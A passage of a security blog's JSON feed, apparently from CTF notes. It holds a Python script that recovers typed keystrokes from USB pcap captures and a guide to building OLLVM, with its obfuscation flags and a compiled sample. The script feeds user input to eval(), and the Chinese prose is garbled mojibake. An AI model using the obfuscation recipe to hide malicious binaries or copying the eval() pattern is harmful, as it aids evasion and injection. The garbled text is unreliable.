class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>press<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>press<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>            <span class=\"token keyword\">if</span> Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"00\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                <span class=\"token keyword\">if</span> Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"00\"</span> <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>normalKeys<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>                    result<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>normalKeys<span class=\"token punctuation\">[</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>                    <span class=\"token comment\"># print(result)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token keyword\">elif</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0b10</span> <span class=\"token keyword\">or</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0b100000</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># shift key is pressed.</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>                <span class=\"token keyword\">if</span> Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"00\"</span> <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>normalKeys<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>                    <span class=\"token comment\"># result.append(self.normalKeys[Bytes[2]])</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>                    result<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>shiftKeys<span class=\"token punctuation\">[</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Unknow Key : %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>Bytes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] USB_Found : %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token comment\"># print(type(result))</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>                a <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;DEL>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>                <span class=\"token keyword\">del</span> result<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>                <span class=\"token keyword\">del</span> result<span class=\"token punctuation\">[</span>a <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>                <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>                <span class=\"token keyword\">if</span> result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"&lt;CAP>\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>                    flag <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>                    result<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                    <span class=\"token keyword\">if</span> flag <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>                        flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>                <span class=\"token keyword\">if</span> flag <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                    result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>            <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>                <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"118\"></td><td><pre>        <span class=\"token comment\"># print ('\\n [+] é”®ç›˜æ•°æ® output :' + \"\".join (result))</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        <span class=\"token comment\"># åˆ é™¤æå–æ•°æ®æ–‡ä»¶</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        rm_stat <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"-----æ˜¯å¦åˆ é™¤tsharkå¯¼å‡ºçš„æ–‡ä»¶ \\\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\\", 1 or 0-----\\n\"</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>        <span class=\"token keyword\">if</span> rm_stat <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>            os<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>datafile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token comment\">#æˆ‘çš„ vscode å·¥ä½œåŒºçš„åŸå› ï¼Œéœ€è¦åˆ‡æ¢åˆ°å½“å‰ç›®å½•</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    pwd <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>dirname<span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    os<span class=\"token punctuation\">.</span>chdir<span class=\"token punctuation\">(</span>pwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    BANNER <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">r\"\"\"                                                                                                                                </span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    //   / / //   ) )  //   ) )                                           </pre></td></tr><tr><td data-num=\"134\"></td><td><pre>   //   / / ((        //___/ /   ___      __      ___      ___     / ___  </pre></td></tr><tr><td data-num=\"135\"></td><td><pre>  //   / /    \\\\     / __  (   //   ) ) //  ) ) //   ) ) //   ) ) //\\ \\   </pre></td></tr><tr><td data-num=\"136\"></td><td><pre> //   / /       ) ) //    ) ) //       //      //   / / //       //  \\ \\  </pre></td></tr><tr><td data-num=\"137\"></td><td><pre>((___/ / ((___ / / //____/ / ((____   //      ((___( ( ((____   //    \\ \\ </pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>                                                                @MAY1AS</pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\"\"\"</pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>BANNER<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre></pre></td></tr><tr><td data-num=\"144\"></td><td><pre></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    argobject <span class=\"token operator\">=</span> argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span>prog<span class=\"token operator\">=</span><span class=\"token string\">\"UsbKbCracker\"</span><span class=\"token punctuation\">,</span> description<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">\"\"\"This is a script for decrypt UsbKeyboardData</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    \"\"\"<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    argobject<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--pcapfile\"</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">\"here is your capturedata file\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    argobject<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-e'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--fieldvalue\"</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">\"here is your output_format\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    argobject<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-Y'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--filterfield\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">\"here is your filter\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    arg <span class=\"token operator\">=</span> argobject<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    kbparser <span class=\"token operator\">=</span> kbpaser<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>     <span class=\"token comment\"># tshark å¯¼å‡ºæ•°æ®ï¼Œå­˜å‚¨åœ¨ usbdatafile.txt å†…</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    kbparser<span class=\"token punctuation\">.</span>tshark_do<span class=\"token punctuation\">(</span>pcapfile<span class=\"token operator\">=</span>arg<span class=\"token punctuation\">.</span>pcapfile<span class=\"token punctuation\">,</span> fieldvalue<span class=\"token operator\">=</span>arg<span class=\"token punctuation\">.</span>fieldvalue<span class=\"token punctuation\">,</span> filterfield<span class=\"token operator\">=</span>arg<span class=\"token punctuation\">.</span>filterfield<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>    kbparser<span class=\"token punctuation\">.</span>formatkbdata<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    kbparser<span class=\"token punctuation\">.</span>jiemi<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>å¾—åˆ°é”®ç›˜è¾“å…¥åè§£ base85</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/15/ollvm%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/",
            "url": "https://3cly.github.io/2023/07/15/ollvm%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/",
            "title": "ollvmç¯å¢ƒé…ç½®",
            "date_published": "2023-07-15T15:16:59.000Z",
            "content_html": "<h1 id=\"ollvmç¯å¢ƒé…ç½®\"><a class=\"markdownIt-Anchor\" href=\"#ollvmç¯å¢ƒé…ç½®\">#</a> ollvm ç¯å¢ƒé…ç½®</h1>\n<h2 id=\"ä»‹ç»\"><a class=\"markdownIt-Anchor\" href=\"#ä»‹ç»\">#</a> ä»‹ç»</h2>\n<p>Ubuntu è™šæ‹Ÿæœº 22.04</p>\n<p>OLLVM ä»‹ç»çœ‹è¿™ä¸ª<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnF1YXJrc2xhYi5jb20vZGVvYmZ1c2NhdGlvbi1yZWNvdmVyaW5nLWFuLW9sbHZtLXByb3RlY3RlZC1wcm9ncmFtLmh0bWw=\"> Deobfuscation: recovering an OLLVM-protected program</span></p>\n<p>Ollvm æ··æ·†ä¸»è¦åˆ†æˆä¸‰ç§æ¨¡å¼ï¼Œè¿™ä¸‰ç§æ¨¡å¼ä¸»è¦æ˜¯æµç¨‹å¹³å¦åŒ–ï¼ŒæŒ‡ä»¤æ›¿æ¢ï¼Œä»¥åŠæ§åˆ¶æµä¼ªé€ ã€‚</p>\n<p><strong>æµç¨‹å¹³å¦åŒ–</strong> ï¼šè¿™ä¸ªæ¨¡å¼ä¸»è¦é€šè¿‡å°† if-else è¯­å¥æ›¿æ¢æˆ do-while è¯­å¥ï¼Œç„¶åé€šè¿‡ switch è¯­å¥æ¥å¯¹æµç¨‹çš„æ§åˆ¶ï¼Œè¿™æ ·å°±èƒ½æ¨¡ç³ŠåŸºæœ¬å—ä¹‹é—´çš„å‰åå…³ç³»ã€‚</p>\n<p><strong>æŒ‡ä»¤æ›¿æ¢</strong> ï¼šè¿™ä¸ªæ¨¡å¼ä¸»è¦é€šè¿‡ä½¿ç”¨æ›´å¤æ‚çš„æŒ‡ä»¤åºåˆ—æ¥æ›¿æ¢ä¸€äº›æ ‡å‡†çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œä»è€Œå¢åŠ é€†å‘çš„éš¾åº¦ã€‚</p>\n<p><strong>æ§åˆ¶æµä¼ªé€ </strong> ï¼šè¿™ä¸ªæ¨¡å¼ä¸»è¦æ˜¯ä¼šåœ¨ä¸€ä¸ªç®€å•çš„è¿ç®—ä¸­å¤–åŒ…å¥½å‡ å±‚ if-else çš„åˆ¤æ–­ï¼Œä»è€Œå¢åŠ é€†å‘çš„éš¾åº¦ã€‚</p>\n<h3 id=\"ä¸€äº›å‚æ•°\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€äº›å‚æ•°\">#</a> ä¸€äº›å‚æ•°</h3>\n<h4 id=\"æ§åˆ¶æµæ‰å¹³åŒ–\"><a class=\"markdownIt-Anchor\" href=\"#æ§åˆ¶æµæ‰å¹³åŒ–\">#</a> <strong>æ§åˆ¶æµæ‰å¹³åŒ–</strong></h4>\n<p>è¿™ä¸ªæ¨¡å¼ä¸»è¦æ˜¯æŠŠä¸€äº› if-else è¯­å¥ï¼ŒåµŒå¥—æˆ do-while è¯­å¥</p>\n<p>-mllvm -flaï¼šæ¿€æ´»æ§åˆ¶æµæ‰å¹³åŒ–</p>\n<p>-mllvm -splitï¼šæ¿€æ´»åŸºæœ¬å—åˆ†å‰²ã€‚åœ¨ä¸€èµ·ä½¿ç”¨æ—¶æ”¹å–„å±•å¹³ã€‚</p>\n<p>-mllvm -split_num=3ï¼šå¦‚æœæ¿€æ´»äº†ä¼ é€’ï¼Œåˆ™åœ¨æ¯ä¸ªåŸºæœ¬å—ä¸Šåº”ç”¨ 3 æ¬¡ã€‚é»˜è®¤å€¼ï¼š1</p>\n<h4 id=\"æŒ‡ä»¤æ›¿æ¢\"><a class=\"markdownIt-Anchor\" href=\"#æŒ‡ä»¤æ›¿æ¢\">#</a> <strong>æŒ‡ä»¤æ›¿æ¢</strong></h4>\n<p>è¿™ä¸ªæ¨¡å¼ä¸»è¦ç”¨åŠŸèƒ½ä¸Šç­‰æ•ˆä½†æ›´å¤æ‚çš„æŒ‡ä»¤åºåˆ—æ›¿æ¢æ ‡å‡†äºŒå…ƒè¿ç®—ç¬¦ (+ , â€“ , &amp; , | å’Œ ^)</p>\n<p>-mllvm -subï¼šæ¿€æ´»æŒ‡ä»¤æ›¿æ¢</p>\n<p>-mllvm -sub_loop=3ï¼šå¦‚æœæ¿€æ´»äº†ä¼ é€’ï¼Œåˆ™åœ¨å‡½æ•°ä¸Šåº”ç”¨ 3 æ¬¡ã€‚é»˜è®¤å€¼ï¼š1</p>\n<h4 id=\"è™šå‡æ§åˆ¶æµç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#è™šå‡æ§åˆ¶æµç¨‹\">#</a> <strong>è™šå‡æ§åˆ¶æµç¨‹</strong></h4>\n<p>è¿™ä¸ªæ¨¡å¼ä¸»è¦åµŒå¥—å‡ å±‚åˆ¤æ–­é€»è¾‘ï¼Œä¸€ä¸ªç®€å•çš„è¿ç®—éƒ½ä¼šåœ¨å¤–é¢åŒ…å‡ å±‚ if-elseï¼Œæ‰€ä»¥è¿™ä¸ªæ¨¡å¼åŠ ä¸Šç¼–è¯‘é€Ÿåº¦ä¼šæ…¢å¾ˆå¤šå› ä¸ºè¦åšå‡ å±‚å‡çš„é€»è¾‘åŒ…è£¹çœŸæ­£æœ‰ç”¨çš„ä»£ç ã€‚</p>\n<p>-mllvm -bcfï¼šæ¿€æ´»è™šå‡æ§åˆ¶æµç¨‹  -mllvm -bcf_loop=3ï¼šå¦‚æœæ¿€æ´»äº†ä¼ é€’ï¼Œåˆ™åœ¨å‡½æ•°ä¸Šåº”ç”¨ 3 æ¬¡ã€‚é»˜è®¤å€¼ï¼š1  -mllvm -bcf_prob=40ï¼šå¦‚æœæ¿€æ´»äº†ä¼ é€’ï¼ŒåŸºæœ¬å—å°†ä»¥ 40ï¼…çš„æ¦‚ç‡è¿›è¡Œæ¨¡ç³Šå¤„ç†ã€‚é»˜è®¤å€¼ï¼š30</p>\n<h4 id=\"å…¶ä»–\"><a class=\"markdownIt-Anchor\" href=\"#å…¶ä»–\">#</a> <strong>å…¶ä»–</strong></h4>\n<p>-mllvm -sobf å¼€å¯å­—ç¬¦ä¸²æ··æ·†</p>\n<p>-mllvm -seed=0xdeadbeaf æŒ‡å®šéšæœºæ•°ç§å­ç”Ÿæˆå™¨</p>\n<h2 id=\"å¼€æ­\"><a class=\"markdownIt-Anchor\" href=\"#å¼€æ­\">#</a> å¼€æ­</h2>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>How to Build:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  $ <span class=\"token function\">git</span> clone https://github.com/yazhiwang/ollvm-tll.git</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  $ <span class=\"token function\">mkdir</span> build</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  $ <span class=\"token builtin class-name\">cd</span> build</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  $ cmake <span class=\"token parameter variable\">-G</span> <span class=\"token string\">\"MinGW Makefiles\"</span> <span class=\"token parameter variable\">-DCMAKE_BUILD_TYPE</span><span class=\"token operator\">=</span>Release <span class=\"token punctuation\">..</span>/ollvm-tll/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  $ <span class=\"token function\">make</span> <span class=\"token parameter variable\">-j7</span></pre></td></tr></table></figure><p>ç„¶åæˆ‘çš„ gcc cmake g++ ç‰ˆæœ¬å¦‚ä¸‹</p>\n<p><img data-src=\"/images/image-20230709134009895.png\" alt=\"image-20230709134009895\"></p>\n<p><img data-src=\"/images/image-20230709134643782.png\" alt=\"image-20230709134643782\"></p>\n<p><img data-src=\"/images/image-20230710003250157.png\" alt=\"image-20230710003250157\"></p>\n<p>ç¼–è¯‘ä¸ª Ollvm ç¼– 2 ä¸ªå°æ—¶äº† è¿˜æ˜¯ 57% ä¸€ç›´è·³ warning æˆ‘éƒ½ä¸çŸ¥é“å¯¹ä¸å¯¹</p>\n<p><img data-src=\"/images/image-20230710011307513.png\" alt=\"image-20230710011307513\"></p>\n<p>å¥½åƒç¡®å®è¦ä¸¤ä¸ªå°æ—¶ æ˜¯æ­£å¸¸çš„</p>\n<h2 id=\"ç¼–è¯‘ä¸€ä¸ªå°ä¾‹å­çœ‹çœ‹\"><a class=\"markdownIt-Anchor\" href=\"#ç¼–è¯‘ä¸€ä¸ªå°ä¾‹å­çœ‹çœ‹\">#</a> ç¼–è¯‘ä¸€ä¸ªå°ä¾‹å­çœ‹çœ‹</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"VAIBIBABO\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span> k<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>/home/mou/ æ¡Œé¢ /build/bin/clang vaibi.c -mllvm -fla  -mllvm -sobf  -mllvm -bcf -o a</p>\n<p>IDA ä¸­çœ‹çœ‹</p>\n<p><img data-src=\"/images/image-20230710140331470.png\" alt=\"image-20230710140331470\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+30h] [rbp-10h]</span></pre></td></tr><tr><td 